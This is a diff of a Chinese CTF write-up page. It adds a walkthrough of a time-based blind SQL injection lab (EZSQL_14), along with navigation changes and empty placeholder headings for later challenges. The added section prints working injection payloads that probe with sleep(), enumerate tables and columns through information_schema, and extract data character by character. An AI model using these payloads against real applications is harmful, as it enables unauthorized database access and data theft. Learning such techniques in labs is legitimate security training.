@@ -218,6 +218,27 @@
             </a>
         </li>
         
+        
+        <li >
+            <a href='/wiki/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-wiki" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M4 5h5a3 3 0 0 1 3 3v11a3 3 0 0 0 -3 -3h-5z" />
+  <path d="M20 5h-5a3 3 0 0 0 -3 3v11a3 3 0 0 1 3 -3h5z" />
+  <path d="M8 9h1" />
+  <path d="M8 12h1" />
+  <path d="M15 9h1" />
+  <path d="M15 12h1" />
+</svg>
+
+                
+                <span>Wiki</span>
+            </a>
+        </li>
+        
         <li class="menu-bottom-section">
             <ol class="menu">
 
@@ -317,6 +338,12 @@
         <li><a href="#ezsql_11字符型-sql-注入---waf-过滤-select--堆叠注入--handler-命令读取数据">EZSQL_11(字符型 SQL 注入 - WAF 过滤 select + 堆叠注入 + handler 命令读取数据)</a></li>
         <li><a href="#ezsql_12字符型-sql-注入---报错回显--extractvalue-错误注入">EZSQL_12(字符型 SQL 注入 - 报错回显 + extractvalue 错误注入)</a></li>
         <li><a href="#ezsql_13字符型-sql-注入---布尔盲注---无数据显示">EZSQL_13(字符型 SQL 注入 - 布尔盲注 - 无数据显示)</a></li>
+        <li><a href="#ezsql_14字符型-sql-注入---时间盲注---无数据显示">EZSQL_14(字符型 SQL 注入 - 时间盲注 - 无数据显示)</a></li>
+        <li><a href="#ezsql_15">EZSQL_15</a></li>
+        <li><a href="#ezsql_16">EZSQL_16</a></li>
+        <li><a href="#ezsql_17">EZSQL_17</a></li>
+        <li><a href="#ezsql_18">EZSQL_18</a></li>
+        <li><a href="#ezsql_19">EZSQL_19</a></li>
       </ol>
     </li>
   </ol>
@@ -446,7 +473,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 28 分钟
+                    阅读时长: 29 分钟
                 </time>
             </div>
         
@@ -463,7 +490,7 @@
 
 
 
-                <span class="article-time--wordcount">13671 字</span>
+                <span class="article-time--wordcount">14244 字</span>
             </div>
         
     </footer>
@@ -2185,7 +2212,67 @@ env 或 printenv 才能看见。</p>
 编写脚本对每个位置遍历 <code>a-z0-9{}_</code> 字符集，42 个字符约需 42×35 ≈ 1500 次请求
 提取全部 42 个字符，得到 <code>flag{fd8914fb-d709-48a6-85e5-cbb368984e7f}</code></p>
 <p><strong>复盘</strong>：这题的核心是<strong>布尔盲注</strong>——页面不显示查询数据，只能通过响应状态（&ldquo;查询成功&rdquo; vs &ldquo;未找到&rdquo;）判断条件真假。与报错注入不同，布尔盲注需要逐字符遍历提取数据，请求量较大但逻辑简单。字符型注入需要用 <code>'</code> 闭合和 <code>#</code> 注释</p>
-
+<h3 id="ezsql_14字符型-sql-注入---时间盲注---无数据显示">EZSQL_14(字符型 SQL 注入 - 时间盲注 - 无数据显示)
+</h3><p>访问靶机，页面是一个&quot;Employee Query&quot;员工查询系统，输入 Employee ID 查询
+正常查询 <code>id=1</code> 返回&quot;The query results have been sent to your email.&quot;，页面<strong>不显示任何数据</strong>
+测试 <code>id=1' and '1'='1</code> 和 <code>id=1' and '1'='0</code>，两者响应内容完全相同（MD5 哈希一致），<strong>无布尔差异</strong>
+尝试时间盲注：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and sleep(3)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>响应延迟 3 秒，确认存在<strong>字符型时间盲注</strong>，<code>sleep()</code> 函数可用，<code>#</code> 注释有效
+无 WAF 过滤，<code>select</code>、<code>union</code>、<code>from</code>、<code>where</code> 等关键词均可正常使用
+确认数据库名，sleep 条件为真时延迟 3 秒：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and sleep(if(database()=&#39;user&#39;,3,0))#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回延迟 3 秒，数据库名为 <code>user</code>
+编写二分查找脚本，利用 <code>ascii(substr(...))</code> 配合 <code>sleep(if(...))</code> 逐字符提取数据
+枚举表名，首字符 ASCII &gt; 100（对应 &rsquo;e&rsquo;），确认 <code>employees,flag</code> 两张表：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and sleep(if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;100,3,0))#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看 flag 表列名，确认 <code>id,flag</code> 两列：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and sleep(if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;),1,1))&gt;100,3,0))#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>逐字符提取 flag 值，每个字符通过二分查找（~7 次请求/字符），42 个字符约 300 次请求：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and sleep(if(ascii(substr((select flag from flag),1,1))&gt;100,3,0))#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>提取全部 42 个字符，得到 <code>flag{eaaa6edb-1425-4cca-9060-4db595c17008}</code></p>
+<p><strong>复盘</strong>：这题的核心是<strong>时间盲注</strong>——页面不显示查询数据，且布尔条件无响应差异，只能通过 <code>sleep()</code> 函数的延迟来判断条件真假。与布尔盲注相比，时间盲注的每个请求都需要等待 sleep 时间，提取速度更慢。字符型注入需要用 <code>'</code> 闭合和 <code>#</code> 注释。做 SQL 注入题遇到无数据显示且无布尔差异时，时间盲注是标准解法</p>
+<h3 id="ezsql_15">EZSQL_15
+</h3><h3 id="ezsql_16">EZSQL_16
+</h3><h3 id="ezsql_17">EZSQL_17
+</h3><h3 id="ezsql_18">EZSQL_18
+</h3><h3 id="ezsql_19">EZSQL_19
+</h3>
 </section>
 
 
